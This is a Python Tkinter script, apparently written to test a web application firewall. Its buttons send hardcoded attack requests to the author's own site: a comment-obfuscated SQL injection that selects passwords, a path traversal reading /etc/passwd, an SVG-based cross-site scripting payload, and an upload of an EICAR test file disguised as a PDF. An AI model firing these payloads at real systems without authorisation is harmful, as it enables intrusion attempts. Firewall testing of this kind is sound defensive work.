"""
23/02/24
Luís Cardoso
nenizera.com
github.com/nenizera
http://www.gnu.org/copyleft/gpl.html


Basic UI Shell using python Tk library

This project contains a basic UI shell using python Tk library. A mini UI with four buttons is displayed. Clicking a botton will execute a function tied to that button as well as show a message on the screen that the action has been executed. This basic foundational UI code using Tk can be easily expanded to define more complicated functions related to the buttons.

Dependencies:
Python 3.11.7 was used. Requires Tkinter/Tk python library. 

**************************************

Added requests code and code for creating attacks for WAF testing purposes to the base UI code.

**************************************
"""


import requests
import os

from tkinter import *
from tkinter import messagebox


site_to_attack = "https://nenizera.com/"

sql_attack = "?**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/usersame/**/LIKE/**/%27tom"
rce_attack = "?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd"
xss_attack = "?globalHtml=%3Csvg%20on%20onContextMenu=alert(1337)%3E"

window = Tk()


def executeSqlAttack():
    attackUrl = site_to_attack + sql_attack

    for i in range (0,3):
        session = requests.Session()
        r = session.get(attackUrl)

    messagebox.showinfo('Message', 'SQLi Attack Completed!')


def executeRceAttack():
    attackUrl = site_to_attack  + rce_attack

    for i in range (0,3):
        session = requests.Session()
        r = session.get(attackUrl)

    messagebox.showinfo('Message', 'RCE Attack Completed!')


def executeXssAttack():
    attackUrl = site_to_attack  + xss_attack

    for i in range (0,3):
        session = requests.Session()
        r = session.get(attackUrl)

    messagebox.showinfo('Message', 'XSS Attack Completed!')


def maliciousFileUpload():
    currDir = os.getcwd()
    malicious_file = {'file': open(currDir + "/eicar-adobe-acrobat-attachment.pdf", 'rb')}
    r = requests.post(site_to_attack, files=malicious_file)

    messagebox.showinfo('Message', 'Malicious File Upload Completed!')


def main():

    window.geometry('400x200')
    window.title("WAF Attack Tests")

    btn_sql_attack = Button(window, text="SQL injection (SQLi) Attack", command = executeSqlAttack)
    btn_sql_attack.pack()

    btn_rce_attack = Button(window, text="Remote code execution (RCE) Attack", command = executeRceAttack)
    btn_rce_attack.pack()

    btn_xss_attack = Button(window, text="Cross-site scripting (XSS) Attack", command = executeXssAttack)
    btn_xss_attack.pack()

    btn_malicious_file_upload = Button(window, text="Upload malicious file", command = maliciousFileUpload)
    btn_malicious_file_upload.pack()

    window.mainloop()


if __name__ == "__main__":
    main()
